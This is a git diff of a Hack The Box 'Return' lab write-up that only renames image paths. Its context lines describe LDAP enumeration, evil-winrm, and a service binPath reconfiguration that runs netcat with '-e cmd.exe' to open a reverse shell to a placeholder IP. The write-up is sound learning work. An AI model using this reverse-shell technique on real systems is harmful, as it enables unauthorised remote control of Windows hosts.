@@ -75,19 +75,19 @@ I then tried found the nmap command to enumerate ldap: `nmap -p 389 --script lda
 
 The walk-through mentioned that we should enter our own IP Address in the **Server Address** section on the website. Using that I got a shell:
 
-![](<../../.gitbook/assets/image (345) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (345) (1) (1) (1) (1) (1).png>)
 
 The walk-through then mentioned using the **evil-winrm** tool. I learned that, while I was able to overwrite the password for the svc-printer user, it would be overwritten by its own system. The walk-through pointed out that the password would be what is shown by the output of netcat connection previously:
 
-![](<../../.gitbook/assets/image (334) (1) (1).png>)
+![](<../../.gitbook/assets/image (334) (1) (1) (1).png>)
 
 Looking around, I was able to find the **user.txt** flag in the Desktop of the svc-printer user:
 
-![](<../../.gitbook/assets/image (335) (1) (1).png>)
+![](<../../.gitbook/assets/image (335) (1) (1) (1).png>)
 
 I am not too familiar with Windows commands, so the walk-through mentioned running the `net user svc-printer` command:
 
-![](<../../.gitbook/assets/image (344) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (344) (1) (1) (1) (1).png>)
 
 Again, I had to view the write-up to see where to go from here. From the commands, you are uploading netcat onto the system, and then configuring netcat to be run and connect to your machine:
 
@@ -95,7 +95,7 @@ Again, I had to view the write-up to see where to go from here. From the command
 
 `sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <YOUR-IP> 1234"`. After having a netcat listener setup on another tab, I was able to get a connection:
 
-![](<../../.gitbook/assets/image (330) (1).png>)
+![](<../../.gitbook/assets/image (330) (1) (1).png>)
 
 The official walk-through got me to become root, however, I was not able to do anything on the machine. I then found this [write-up](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/) that helped me setup a proper shell. Here are the commands I used:
 
@@ -119,4 +119,4 @@ sc.exe start VSS
 
 I was then able to get the root.txt file:
 
-![](<../../.gitbook/assets/image (332) (1) (1).png>)
+![](<../../.gitbook/assets/image (332) (1) (1) (1).png>)
